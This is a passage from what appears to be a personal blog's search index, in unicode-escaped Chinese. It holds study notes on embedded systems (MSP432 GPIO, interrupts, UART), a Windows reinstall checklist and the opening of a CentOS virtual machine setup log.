\u7b2c\u4e94\u7248","text":"","tags":["\u5d4c\u5165\u5f0f"]},{"location":"%E9%98%85%E8%AF%BB/2020/01/01/2020-01-01-%E5%B5%8C%E5%85%A5%E5%BC%8F%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%AE%9E%E8%B7%B5/#\u5fc3\u5f97","title":"\u5fc3\u5f97","text":"<ol> <li> <p>\u4e3a\u4ec0\u4e48\u5355\u7247\u673a\u53ef\u4ee5\u63a7\u5236\u706f\u7684\u4eae\u706d\uff0c\u901a\u7528PC\u5374\u6ca1\u529e\u6cd5\u63a7\u5236\u706f\u5462\uff1f\uff08\u56e0\u4e3a\u6ca1\u6709CPU\u5230LED\u7684\u63a5\u53e3\u4e5f\u6ca1\u6709\u9a71\u52a8\u7a0b\u5e8f\uff09</p> </li> <li> <p>\u4e2d\u65ad\u5411\u91cf\u673a\u5236\u548cMIPS\u91c7\u7528\u7684\u7edf\u4e00\u5165\u53e3\u5730\u5740\u4e0d\u592a\u4e00\u6837\u3002\u4e2d\u65ad\u5411\u91cf\u673a\u5236\u786c\u4ef6\u4ea7\u751f\u4e2d\u65ad\u8bf7\u6c42\u65f6\uff0c\u4e2d\u65ad\u53f7\u662f\u786e\u5b9a\u4e86\u7684\uff08\u901a\u8fc7\u4e2d\u65ad\u63a7\u5236\u5668\u53d1\u9001\u4e2d\u65ad\u53f7\uff09\uff0c\u8f6f\u4ef6\u53ef\u4ee5\u914d\u7f6e\u5bf9\u5e94\u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\u3002\u800cMIPS\u6ca1\u6709\u4e2d\u65ad\u53f7\u7684\u6982\u5ff5\uff0c\u901a\u8fc7\u8f6f\u4ef6\u68c0\u67e5Stastus\u5bc4\u5b58\u5668\uff0c\u6765\u786e\u5b9a\u662f\u54ea\u4e00\u4e2a\u4e2d\u65ad\uff0c\u8df3\u8f6c\u5230\u5bf9\u5e94\u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\u3002</p> </li> </ol> <p>\u4e2d\u65ad\u5411\u91cf\u673a\u5236\u7684CPU\u901a\u5e38\u9700\u8981\u4e00\u4e2a\u4e2d\u65ad\u63a7\u5236\u5668\uff0c\u8fde\u63a5\u5728\u603b\u7ebf\u4e0a\u3002\u4e2d\u65ad\u63a7\u5236\u5668\u4f1a\u7ed9CPU\u63d0\u4f9b\u4e2d\u65ad\u53f7\u3002</p> <ol> <li> <p>MCU\u672c\u8d28\u5c31\u662f\u4e00\u4e2a\u5fae\u578b\u8ba1\u7b97\u673a\uff0c\u5305\u542bCPU\uff0c\u5b58\u50a8\u5668\uff0cI/O\u63a5\u53e3\uff08\u63a7\u5236\u5668\u6a21\u5757\uff09\u3002\u5d4c\u5165\u5f0f\u5f00\u53d1\u5c31\u662f\u8981\u57fa\u4e8eMCU\u642d\u5efa\u4e00\u4e2a\u786c\u4ef6\u7cfb\u7edf\uff08\u901a\u8fc7MCU\u7684I/O\u63a5\u53e3\u8fde\u63a5\u5404\u79cd\u9700\u8981\u88ab\u63a7\u5236\u7684\u5916\u8bbe\uff09\uff0c\u5e76\u9010\u5c42\u5411\u4e0a\u7f16\u5199\u6784\u4ef6\uff08\u9a71\u52a8\uff09\uff0c\u6700\u540e\u57fa\u4e8e\u6784\u4ef6\u7f16\u5199\u5d4c\u5165\u5f0f\u5e94\u7528\uff0c\u4ece\u800c\u5b8c\u6210\u9700\u8981\u7684\u529f\u80fd\u3002</p> </li> <li> <p>MCU\u7531\u4e8e\u9700\u8981\u901a\u7528\u6027\uff0c\u4f7f\u5f97\u7528\u6237\u53ef\u4ee5\u57fa\u4e8eMCU\u53bb\u642d\u5efa\u81ea\u5df1\u7684\u7cfb\u7edf\uff0c\u9a71\u52a8\u81ea\u5df1\u7684\u5916\u8bbe\uff0c\u56e0\u6b64\u6bcf\u4e2a\u5f15\u811a\u90fd\u590d\u7528\u591a\u4e2a\u529f\u80fd\u3002\u901a\u8fc7\u914d\u7f6eMCU\u5185\u5bf9\u5e94\u63a7\u5236\u5668\u7684\u5bc4\u5b58\u5668\u6765\u914d\u7f6e\u5f15\u811a\u7684\u529f\u80fd\u3002</p> </li> </ol> <p>\u6bd4\u5982MSP432 100\u4e2a\u5f15\u811a\u4e2d\u670984\u4e2a\u53ef\u4ee5\u914d\u7f6e\u6210GPIO\u5f15\u811a\u3002\u53ea\u9700\u8981\u5c06MSP432\u5206\u914d\u7684GPIO\u5bc4\u5b58\u5668\u4e2d\u7684PxSEL0, PxSEL1\u5bc4\u5b58\u5668\uff08x\u8868\u793a\u7aef\u53e3\u53f7\uff0c\u670911\u4e2a\u7aef\u53e3P1~P10\u548cPJ\uff09\u90fd\u7f6e\u4e3a0\u65f6\uff0c\u8be5\u7aef\u53e3\u7684\u5f15\u811a\u5373\u4e3aGPIO\u529f\u80fd\u3002\u540c\u6837\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6eGPIO\u5bc4\u5b58\u5668\u63a7\u5236\u5f15\u811a\u65b9\u5411\u4f5c\u4e3a\u8f93\u5165\u8fd8\u662f\u8f93\u51fa\uff0c\u7528\u4e8e\u70b9\u4eaeLED\u706f\u6216\u8005\u63a5\u53d7\u5f00\u5173\u8f93\u5165\u3002</p> <p>\u518d\u6bd4\u5982MSP432\u67094\u4e2a\u589e\u5f3a\u578b\u901a\u7528\u4e32\u884c\u901a\u4fe1\u63a5\u53e3\u6a21\u5757(eUSCI)\uff0c\u4e5f\u5206\u914d\u4e86\u82e5\u5e72\u5bc4\u5b58\u5668\u3002\u901a\u8fc7\u914d\u7f6e\u5bc4\u5b58\u5668\u53ef\u4ee5\u5c06\u5bf9\u5e94\u5f15\u811a\u914d\u7f6e\u4e3aUART\u7684\u5f15\u811a\u6216SPI\u7684\u5f15\u811a\u3002</p> <p>\u4f46\u662f\u6211\u4eec\u5728FPGA\u4e0a\u642d\u5efaSoC\u65f6\uff0c\u5f00\u53d1\u677f\u4e0a\u7684\u706f\u3001\u62e8\u7801\u5f00\u5173\u548cFGPA\u82af\u7247\u7684\u5f15\u811a\u662f\u8fde\u597d\u4e86\u7684\uff08\u7531\u5f00\u53d1\u677f\u7684\u63d0\u4f9b\u5546\u57fa\u4e8eFPGA\u82af\u7247\u642d\u5efa\uff09\uff0c\u4e5f\u5c31\u662f\u8bf4\u6bcf\u4e2a\u5f15\u811a\u4f5c\u4e3a\u8f93\u5165\u8fd8\u662f\u8f93\u51fa\u662f\u5df2\u7ecf\u786e\u5b9a\u4e86\u7684\u3002\u6211\u4eec\u80fd\u6539\u53d8\u7684\u53ea\u662f\u2014\u2014\u662f\u5426\u4f7f\u7528\u8be5\u5916\u8bbe\u3002\u5f53\u7136\uff0c\u4e0d\u6392\u9664\u4fdd\u7559\u4e86\u4e00\u4e9b\u5f15\u811a\u88ab\u63a5\u5230\u6269\u5c55\u63d2\u53e3\u4e0a\uff08\u90a3\u4e00\u6392\u6392\u7684\u9ed1\u8272\u63d2\u5b54\uff09\u3002\u56e0\u6b64\u5728FPGA\u4e0a\u642d\u5efaSoC\u540e\uff0c\u5b9e\u73b0\u5916\u8bbe\u9a71\u52a8\u9700\u8981\u5bf9\u5916\u8bbe\u7684\u63a7\u5236\u5668\u8fdb\u884c\u914d\u7f6e\u3002\u800c\u5d4c\u5165\u5f0f\u5f00\u53d1\u8fd8\u591a\u51fa\u4e86\u914d\u7f6eMCU\u5185\u7528\u4e8e\u590d\u7528\u7684\u6a21\u5757\u5bc4\u5b58\u5668\u3002</p> <ul> <li>\u5d4c\u5165\u5f0f\u6280\u672f\u57fa\u7840\u4e0e\u5b9e\u8df5 \u7b2c\u4e94\u7248<ul> <li>\u5fc3\u5f97</li> <li>\u7b2c\u4e00\u7ae0\uff1a\u6982\u8ff0</li> <li>\u7b2c\u4e8c\u7ae0\uff1aARM Cortex-M4F\u5904\u7406\u5668</li> <li>\u7b2c\u4e09\u7ae0\uff1a\u5b58\u50a8\u6620\u50cf\u3001\u4e2d\u65ad\u6e90\u4e0e\u786c\u4ef6\u6700\u5c0f\u7cfb\u7edf</li> <li>\u7b2c\u56db\u7ae0\uff1aGPIO\u53ca\u7a0b\u5e8f\u6846\u67b6</li> <li>\u7b2c\u4e94\u7ae0\uff1a\u5d4c\u5165\u5f0f\u786c\u4ef6\u6784\u4ef6\u4e0e\u5e95\u5c42\u9a71\u52a8\u6784\u4ef6\u57fa\u672c\u89c4\u8303</li> <li>\u7b2c\u516d\u7ae0\uff1a\u4e32\u884c\u901a\u4fe1\u6a21\u5757\u53ca\u7b2c\u4e00\u4e2a\u4e2d\u65ad\u7a0b\u5e8f\u7ed3\u6784</li> </ul> </li> </ul>","tags":["\u5d4c\u5165\u5f0f"]},{"location":"%E9%98%85%E8%AF%BB/2020/01/01/2020-01-01-%E5%B5%8C%E5%85%A5%E5%BC%8F%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%AE%9E%E8%B7%B5/#\u7b2c\u4e00\u7ae0\u6982\u8ff0","title":"\u7b2c\u4e00\u7ae0\uff1a\u6982\u8ff0","text":"<ol> <li>\u5728MCU\u51fa\u73b0\u4e4b\u524d\uff0c\u4eba\u4eec\u5fc5\u987b\u4f7f\u7528\u6a21\u62df\u7535\u8def\u3001\u6570\u5b57\u7535\u8def\u5b9e\u73b0\u6d4b\u63a7\u7cfb\u7edf\u4e2d\u7684\u5927\u90e8\u5206\u8ba1\u7b97\u4e0e\u63a7\u5236\u529f\u80fd\u3002</li> </ol> <p>\u5728MCU\u51fa\u73b0\u540e\uff0c\u8ba1\u7b97\u4e0e\u63a7\u5236\u7531\u8f6f\u4ef6\u5b9e\u73b0\uff0c\u5176\u5b83\u7535\u5b50\u7ebf\u8def\u6210\u4e3aMCU\u7684\u5916\u56f4\u7535\u8def\uff0c\u627f\u62c5\u8f93\u5165\u3001\u8f93\u51fa\u4e0e\u6267\u884c\u52a8\u4f5c\u7b49\u529f\u80fd\u3002</p> <ol> <li> <p>\u5e38\u7528\u672f\u8bed</p> </li> <li> <p>\u5c01\u88c5(Package)\uff0c\u7528\u5851\u6599\u3001\u91d1\u5c5e\u6216\u9676\u74f7\u6750\u6599\u5c06\u96c6\u6210\u7535\u8def\u5c01\u88c5\u5728\u5176\u4e2d\u3002</p> </li> <li> <p>PCB\uff08Printed Circuit Board\uff0c\u5370\u5237\u7535\u8def\u677f\uff09\u3002\u7535\u8def\u539f\u7406\u56fe\u7684\u5b9e\u7269\u5316\uff0c\u5b9e\u73b0\u5404\u5143\u4ef6\u7684\u5e03\u7ebf\u3002</p> </li> <li> <p>\u5e38\u89c1\u5b58\u50a8\u5668\uff1aRAM, ROM, PROM, EPROM, EEPROM, Flash Memory</p> </li> <li> <p>\u51e0\u79cd\u63a5\u53e3\u53d1\u5c55\uff1aUART\uff08\u5f02\u6b65\u4e32\u884c\u901a\u4fe1\u63a5\u53e3\uff0c\u901a\u7528\u5f02\u6b65\u6536\u53d1\u5668\uff0cUniversal Asynchronous Receiver Transmitters\uff09-&gt;SPI\uff08\u4e32\u884c\u5916\u8bbe\u63a5\u53e3\uff0cSerial Peripheral Interface\uff09-&gt;I2C\uff08\u96c6\u6210\u7535\u8def\u4e92\u8054\u603b\u7ebf\uff0cInter-Integrated Circuit\uff09-&gt;USB\uff08\u901a\u7528\u4e32\u884c\u603b\u7ebf\uff0cUniversal Serial Bus\uff09</p> </li> <li> <p>\u8fb9\u754c\u626b\u63cf\u6d4b\u8bd5\u534f\u8baeJTAG\uff08Joint Test Action Group\uff0c\u56fd\u9645\u8054\u5408\u6d4b\u8bd5\u884c\u52a8\u7ec4\uff09\u3002\u5bf9\u82af\u7247\u8fdb\u884c\u6d4b\u8bd5\u7684\u4e00\u79cd\u65b9\u5f0f\uff0c\u80fd\u591f\u83b7\u53d6\u82af\u7247\u5bc4\u5b58\u5668\u7684\u5185\u5bb9\uff0c\u6216\u6d4b\u8bd5\u5668\u4ef6\u95f4\u5f15\u811a\u7684\u8fde\u63a5\u60c5\u51b5\u3002</p> <p>-&gt; SWD\uff08Serial wire Debug\uff0c\u4e32\u884c\u8c03\u8bd5\u7ebf\uff09\u3002\u4f7f\u7528\u66f4\u5c11\u9488\u811a\uff0c\u662fJTAG\u7684\u9ad8\u6027\u80fd\u66ff\u4ee3\u54c1\u3002</p> </li> <li> <p>RTOS\uff0c\u5b9e\u65f6\u64cd\u4f5c\u7cfb\u7edf</p> </li> <li> <p>\u770b\u95e8\u72d7\uff0c\u7528\u4e8e\u68c0\u67e5\u7a0b\u5e8f\u662f\u5426\u8dd1\u5206\u3002\u7a0b\u5e8f\u8dd1\u98de\u540e\uff0c\u7531\u4e8e\u65e0\u6cd5\u6e05\u9664\u6389\u770b\u95e8\u72d7\u7684\u8ba1\u65f6\u5668\uff0c\u56e0\u6b64\u4f1a\u5bfc\u81f4CPU\u590d\u4f4d</p> </li> <li> <p>ISR\uff08\u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\uff0cInterrupt Service Routine\uff09</p> </li> </ol>","tags":["\u5d4c\u5165\u5f0f"]},{"location":"%E9%98%85%E8%AF%BB/2020/01/01/2020-01-01-%E5%B5%8C%E5%85%A5%E5%BC%8F%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%AE%9E%E8%B7%B5/#\u7b2c\u4e8c\u7ae0arm-cortex-m4f\u5904\u7406\u5668","title":"\u7b2c\u4e8c\u7ae0\uff1aARM Cortex-M4F\u5904\u7406\u5668","text":"<ol> <li>ARM Cortex\u5904\u7406\u5668\u5206\u4e3aM\u3001R\u3001A\u7cfb\u5217\u3002A\uff1a\u4ee3\u8868\u5e94\u7528\u5904\u7406\u5668\uff0c\u7528\u4e8e\u624b\u673a\u3002M\u4ee3\u8868\u4f4e\u529f\u8017\u3002</li> <li>ARM v7\u662f32\u4f4d\u6307\u4ee4\u96c6\uff0cARM v8\u662f64\u4f4d\u3002Thumb\u662fARM\u4e2d\u4e00\u79cd16\u4f4d\u6307\u4ee4\u96c6\uff0cThumb2\u662f16/32\u6df7\u5408\u6307\u4ee4\u96c6</li> <li>MSP432\u662fTI\uff08\u5fb7\u5dde\u4eea\u5668\uff09\u751f\u4ea7\u7684\u57fa\u4e8eCortex-M4F\u5904\u7406\u5668\u7684\u5fae\u63a7\u5236\u5668</li> <li>ARM\u6c47\u7f16\u53c2\u8003\u300aGUN\u6c47\u7f16\u8bed\u6cd5\u300b</li> </ol>","tags":["\u5d4c\u5165\u5f0f"]},{"location":"%E9%98%85%E8%AF%BB/2020/01/01/2020-01-01-%E5%B5%8C%E5%85%A5%E5%BC%8F%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%AE%9E%E8%B7%B5/#\u7b2c\u4e09\u7ae0\u5b58\u50a8\u6620\u50cf\u4e2d\u65ad\u6e90\u4e0e\u786c\u4ef6\u6700\u5c0f\u7cfb\u7edf","title":"\u7b2c\u4e09\u7ae0\uff1a\u5b58\u50a8\u6620\u50cf\u3001\u4e2d\u65ad\u6e90\u4e0e\u786c\u4ef6\u6700\u5c0f\u7cfb\u7edf","text":"<ol> <li>MCU\u7684\u5f15\u811a\u5305\u542b\u4e24\u7c7b\uff0c\u4e00\u7c7b\u662f\u4e3aMCU\u63d0\u4f9b\u670d\u52a1\u7684\u5f15\u811a\uff0c\u5982\u7535\u6e90\u3001\u590d\u4f4d\u3001\u6676\u632f\u7b49\u3002\u53e6\u4e00\u7c7b\u662fMCU\u5bf9\u5916\u63d0\u4f9b\u670d\u52a1\u7684\u5f15\u811a\uff0c\u4e5f\u79f0\u4e3aI/O\u7aef\u53e3\u8d44\u6e90\u7c7b\u5f15\u811a\u3002</li> <li>MCU\u5185\u90e8\u5305\u542b\uff081\uff09CPU\uff1b\uff082\uff09SRAM\u3001ROM\u548cFlash\u4f5c\u4e3a\u5b58\u50a8\u5668\uff1b\uff083\uff09I/O\u63a5\u53e3\uff08\u63a7\u5236\u5668\uff09\uff0c\u5982UART, I2C, SPI\u901a\u4fe1\u6a21\u5757\uff0cJTAG\u548cSWD\u7684\u8c03\u8bd5\u63a5\u53e3\u3002</li> <li>MCU\u5df2\u7ecf\u5bf9\u5730\u5740\u7a7a\u95f4\u8fdb\u884c\u4e86\u5206\u914d\u3002\u4e5f\u4e3a\u6bcf\u4e2a\u4e2d\u65ad\u6e90\u5206\u914d\u4e86\u4e2d\u65ad\u53f7\u3002</li> <li>MCU\u7684\u786c\u4ef6\u6700\u5c0f\u7cfb\u7edf\uff08\u57fa\u4e8eMCU\u642d\u5efa\u7684\u6700\u5c0f\u7cfb\u7edf\uff09\u662f\u6307\u53ef\u4f7f\u5185\u90e8\u7a0b\u5e8f\u8fd0\u884c\u7684\u3001\u89c4\u8303\u7684\u3001\u53ef\u590d\u7528\u7684\u6838\u5fc3\u6784\u4ef6\u7cfb\u7edf\u3002\u4e00\u822c\u5305\u542b\uff0c\u7535\u6e90\uff0c\u6676\u632f\uff0c\u590d\u4f4d\uff0c\u5199\u5165\u8c03\u8bd5\u5668\u63a5\u53e3\uff08\u5982SWD\uff1b\u5c06\u7a0b\u5e8f\u5199\u5165\u82af\u7247\uff09</li> </ol>","tags":["\u5d4c\u5165\u5f0f"]},{"location":"%E9%98%85%E8%AF%BB/2020/01/01/2020-01-01-%E5%B5%8C%E5%85%A5%E5%BC%8F%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%AE%9E%E8%B7%B5/#\u7b2c\u56db\u7ae0gpio\u53ca\u7a0b\u5e8f\u6846\u67b6","title":"\u7b2c\u56db\u7ae0\uff1aGPIO\u53ca\u7a0b\u5e8f\u6846\u67b6","text":"<ol> <li>\u4e3b\u8981\u4ecb\u7ecd\u4e86\u5982\u4f55\u7f16\u5199GPIO\u7684\u6784\u4ef6(gpio_init(port, pin, IN/OUT, STATUS))\uff0c\u518d\u5728\u6b64\u57fa\u7840\u4e0a\u7f16\u5199\u63a7\u5236\u5c0f\u706f\u7684\u6784\u4ef6(light_init(port, pin, ON/OFF))\u3002</li> <li>\u5d4c\u5165\u5f0f\u9879\u76ee\u7684\u6807\u51c6\u7ed3\u6784\uff08\u76ee\u5f55\u5206\u7c7b\uff09\uff0cCPU\u6709\u5173\uff0cMCU\u6709\u5173\uff08\u5bc4\u5b58\u5668\u5730\u5740\u6620\u5c04\uff09\uff0c\u7528\u6237\u6784\u5efa\u7684\u7535\u8def\u76f8\u5173UserBoard\uff08\u5982\u5c06LED\u706f\u8fde\u63a5\u5230MCU\u4e0a\uff09\uff0c\u9876\u5c42\u5e94\u7528\u3002</li> <li>\u4ecb\u7ecd\u4e86\u94fe\u63a5\u811a\u672c\u7684\u5185\u5bb9\u542b\u4e49\u3002</li> </ol>","tags":["\u5d4c\u5165\u5f0f"]},{"location":"%E9%98%85%E8%AF%BB/2020/01/01/2020-01-01-%E5%B5%8C%E5%85%A5%E5%BC%8F%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%AE%9E%E8%B7%B5/#\u7b2c\u4e94\u7ae0\u5d4c\u5165\u5f0f\u786c\u4ef6\u6784\u4ef6\u4e0e\u5e95\u5c42\u9a71\u52a8\u6784\u4ef6\u57fa\u672c\u89c4\u8303","title":"\u7b2c\u4e94\u7ae0\uff1a\u5d4c\u5165\u5f0f\u786c\u4ef6\u6784\u4ef6\u4e0e\u5e95\u5c42\u9a71\u52a8\u6784\u4ef6\u57fa\u672c\u89c4\u8303","text":"<ol> <li>\u786c\u4ef6\u6784\u4ef6\u53ef\u4ee5\u5206\u4e3a\u6838\u5fc3\u6784\u4ef6\uff0c\u4e2d\u95f4\u6784\u4ef6\uff0c\u7ec8\u7aef\u6784\u4ef6\u3002\u6838\u5fc3\u6784\u4ef6\u53ea\u5bf9\u5916\u63d0\u4f9b\u670d\u52a1\u5982MCU\u6700\u5c0f\u786c\u4ef6\u7cfb\u7edf\uff0c\u7ec8\u7aef\u6784\u4ef6\u53ea\u5bf9\u5916\u63d0\u51fa\u9700\u6c42\u5982LED\u6784\u4ef6\u3002</li> <li>\u5d4c\u5165\u5f0f\u8f6f\u4ef6\u6784\u4ef6\uff1a</li> <li>\u9762\u5411\u82af\u7247\u7ea7\u7684\u786c\u4ef6\u9a71\u52a8\u6784\u4ef6\u3002\u5982GPIO\u6784\u4ef6\u3002</li> <li>\u9762\u5411\u5b9e\u9645\u5e94\u7528\u786c\u4ef6\u6a21\u5757\u3002\u5982Light\u6784\u4ef6\u3002</li> <li>\u9762\u5411\u7b97\u6cd5\uff0c\u5982\u94fe\u8868\u3001\u961f\u5217\u3001\u6392\u5e8f\u7b97\u6cd5\u7b49\u3002</li> </ol>","tags":["\u5d4c\u5165\u5f0f"]},{"location":"%E9%98%85%E8%AF%BB/2020/01/01/2020-01-01-%E5%B5%8C%E5%85%A5%E5%BC%8F%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%AE%9E%E8%B7%B5/#\u7b2c\u516d\u7ae0\u4e32\u884c\u901a\u4fe1\u6a21\u5757\u53ca\u7b2c\u4e00\u4e2a\u4e2d\u65ad\u7a0b\u5e8f\u7ed3\u6784","title":"\u7b2c\u516d\u7ae0\uff1a\u4e32\u884c\u901a\u4fe1\u6a21\u5757\u53ca\u7b2c\u4e00\u4e2a\u4e2d\u65ad\u7a0b\u5e8f\u7ed3\u6784","text":"<ol> <li> <p>\u4e32\u884c\u901a\u4fe1\u63a5\u53e3\u7b80\u79f0\u4e32\u53e3\uff0cUART\u6216SCI(serial communication interface)\u3002</p> </li> <li> <p>\u7a7a\u95f2\u72b6\u6001\u662f1\uff0c\u53d1\u9001\u4e00\u4e2a0\u8868\u793a\u4e00\u4e2a\u5b57\u8282\u4f20\u8f93\u5f00\u59cb\uff0c\u968f\u540e\u662f\u5b57\u8282\u6570\u636e\uff0c\u6700\u540e\u662f1\u4f4d\u62162\u4f4d\u7684\u505c\u6b62\u4f4d\u3002\u5f00\u59cb\u4f4d\u548c\u505c\u6b62\u4f4d\u5f71\u54cd\u4e86\u4e32\u53e3\u7684\u4f20\u8f93\u901f\u7387\u3002</p> </li> <li> <p>MCU\u8f93\u51fa\u7684\u662fTTL\uff08\u6676\u4f53\u7ba1-\u6676\u4f53\u7ba1\u903b\u8f91\u7535\u5e73\uff0cTransistor-Transistor Logic\uff09\uff0c1\u548c0\u7684\u7279\u5f81\u7535\u538b\u503c\u662f2.4V\u548c0V\u3002\u800cRS232\u6807\u51c6\u91c7\u7528\u8d1f\u903b\u8f91\uff08\u4e3a\u4e86\u4f20\u8f93\u7684\u66f4\u8fdc\uff09\uff0c-15V\u5230-3V\u4e3a1\uff0c+3V\u5230+15V\u4e3a0\u3002\u56e0\u6b64\u9700\u8981\u7535\u5e73\u8f6c\u6362\u7535\u8def\u3002</p> </li> <li> <p>9\u82af\u4e32\u884c\u63a5\u53e3</p> </li> <li> <p>\u63a5\u6536\u7ebf\u4fe1\u53f7\u68c0\u6d4b</p> </li> <li> <p>RxD \u63a5\u6536\u6570\u636e\u7ebf</p> </li> <li>TxD\u53d1\u9001\u6570\u636e\u7ebf</li> <li>DTR\u6570\u636e\u7ec8\u7aef\u51c6\u5907\u5c31\u7eea</li> <li>SG\u4fe1\u53f7\u5730</li> <li>DSR\u6570\u636e\u901a\u4fe1\u8bbe\u5907\u51c6\u5907\u5c31\u7eea</li> <li>RTS\u8bf7\u6c42\u53d1\u9001</li> <li>CTS\u5141\u8bb8\u53d1\u9001</li> <li>\u632f\u94c3\u63d0\u793a</li> </ol> <p>\u5e38\u5e38\u4f7f\u7528\u7cbe\u7b80\u7684RS232\u901a\u4fe1\uff0c\u4ec5\u4f7f\u7528RxD\u3001TxD\u548cSG\u3002\u5176\u5b83\u4e3a\u8fdb\u884c\u8fdc\u7a0b\u4f20\u8f93\u65f6\u63a5\u8c03\u5236\u89e3\u8c03\u5668\u7528\uff0c\u6709\u7684\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u786c\u4ef6\u63e1\u624b\u4fe1\u53f7\uff08\u5982RTS\u548cCTS\uff09</p>","tags":["\u5d4c\u5165\u5f0f"]},{"location":"%E6%8A%98%E8%85%BE/2020/02/02/2020-02-02-windows%E9%87%8D%E8%A3%85%E7%B3%BB%E7%BB%9F%E6%AD%A5%E9%AA%A4/","title":"windows\u91cd\u88c5\u7cfb\u7edf\u6b65\u9aa4","text":"<p>windows\u91cd\u88c5\u7cfb\u7edf\u6b65\u9aa4</p> <ol> <li> <p>\u4e0b\u8f7diso\u955c\u50cf i.cqu.edu.cn -&gt; \u6b63\u7248\u8f6f\u4ef6 -&gt; windows10-pro</p> </li> <li> <p>\u5236\u4f5c\u542f\u52a8\u76d8 refus\uff08\u6216\u8005\u53ef\u4ee5\u76f4\u63a5\u53cc\u51fbiso\u955c\u50cf\u5b89\u88c5\uff1f\uff09</p> </li> <li> <p>\u4fdd\u5b58C\u76d8\u6587\u4ef6</p> </li> <li> <p>home\u914d\u7f6e\uff08ssh, gitconfig\uff09</p> </li> <li>\u77e5\u4e4b\u9605\u8bfb</li> <li>windows terminal \u914d\u7f6e</li> <li> <p>\u5b89\u88c5\uff08\u8df3\u8fc7\u8054\u7f51\u5b89\u88c5\u6700\u5feb\uff0c\u65b9\u5f0f\u4e3a\u4f9d\u6b21\u70b9\u51fb4\u4e2a\u89d2\uff09</p> </li> <li> <p>\u6fc0\u6d3b\uff08\u4e0b\u8f7d\u6fc0\u6d3b\u5668\uff0c\u8f93\u5165\u5b66\u751f\u7edf\u4e00\u8ba4\u8bc1\u53f7\u548c\u91cd\u5927\u6b63\u7248\u8f6f\u4ef6\u7f51\u7ad9\u7684\u6fc0\u6d3b\u7801\uff09</p> </li> <li> <p>\u767b\u5f55\u5fae\u8f6f\u8d26\u53f7\uff0c\u66f4\u65b0\u7cfb\u7edf\uff0c\u91cd\u542f</p> </li> <li> <p>\u4e2a\u6027\u5316    \u6de1\u8272\u3001\u900f\u660e</p> </li> <li> <p>\u8bbe\u7f6e\u5feb\u901f\u8bbf\u95ee</p> </li> <li> <p>$home</p> </li> <li>Dowloads</li> <li>Document</li> <li>GithubRepo</li> <li>ENV</li> <li> <p>dev</p> </li> <li> <p>\u6062\u590d\u8f6f\u4ef6</p> </li> <li> <p>\u6d4f\u89c8\u5668       Edge\u65b0\u7248, Chrome \uff08\u767b\u5f55\u8d26\u53f7\u5373\u53ef\uff0c\u4f1a\u81ea\u52a8\u6062\u590d\u6536\u85cf\u5939\u3001\u63d2\u4ef6</p> </li> <li> <p>basic\u57fa\u7840\u8f6f\u4ef6(\u5fc5\u5907\u7684\uff0c\u63d0\u5347\u6548\u7387\u7684\u8f6f\u4ef6\u3001\u5168\u5728E\u76d8\uff08\u56fa\u6001\u76d8\uff09\uff09</p> </li> <li> <p>listary</p> </li> <li> <p>QQ</p> </li> <li> <p>ext\u8f6f\u4ef6</p> </li> <li> <p>windows\u5546\u5e97\u7a0b\u5e8f</p> <ul> <li>snipaste</li> <li>windows terminal</li> </ul> </li> </ol> <p>\u5176\u5b83\uff1a</p> <ul> <li>\u6062\u590dwifi\u5bc6\u7801  \u6062\u590dC:\\ProgramData\\Microsoft\\Wlansvc\\Profiles\\Interfaces\\\u4e0b\u6587\u4ef6</li> <li>\u4e4b\u524d\u4f7f\u7528windows\u7684\u5907\u4efd\u521b\u5efa\u4e86\u7cfb\u7edf\u955c\u50cf\uff0c\u7ed3\u679c\u8fd9\u6b21\u91cd\u88c5\u627e\u4e0d\u5230</li> <li>\u4f7f\u7528windows\u7684\u6062\u590d-&gt;\u91cd\u7f6e\u7535\u8111\u6765\u91cd\u88c5\u7cfb\u7edf\u975e\u5e38\u6162</li> </ul>","tags":["windows","\u91cd\u88c5\u7cfb\u7edf"]},{"location":"%E6%8A%98%E8%85%BE/2020/02/02/2020-02-02-%E5%AE%89%E8%A3%85centos%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BB%A5%E5%8F%8A%E9%85%8D%E7%BD%AEgameboy.live%E8%AE%B0%E5%BD%95/","title":"\u5b89\u88c5centos\u865a\u62df\u673a\u4ee5\u53ca\u914d\u7f6egameboy.live\u8bb0\u5f55","text":"<p>\u5b89\u88c5centos\u865a\u62df\u673a\u4ee5\u53ca\u914d\u7f6egameboy.live\u8bb0\u5f55</p>","tags":["centos","gameboy"]},{"location":"%E6%8A%98%E8%85%BE/2020/02/02/2020-02-02-%E5%AE%89%E8%A3%85centos%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BB%A5%E5%8F%8A%E9%85%8D%E7%BD%AEgameboy.live%E8%AE%B0%E5%BD%95/#1-\u4e0b\u8f7d\u955c\u50cf","title":"1. \u4e0b\u8f7d\u955c\u50cf","text":"<p>\u5728\u6e05\u534e\u6e90\u7b49\u955c\u50cf\u6e90\u90fd\u53ef\u4ee5\uff0c\u6211\u4e0b\u8f7d\u7684\u662feverything\u7248\u672c\uff08\u670910G\u5de6\u53f3\uff09</p>","tags":["centos","gameboy"]},{"location":"%E6%8A%98%E8%85%BE/2020/02/02/2020-02-02-%E5%AE%89%E8%A3%85centos%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BB%A5%E5%8F%8A%E9%85%8D%E7%BD%AEgameboy.live%E8%AE%B0%E5%BD%95/#2-virtualbox\u5b89\u88c5centos","title":"2. 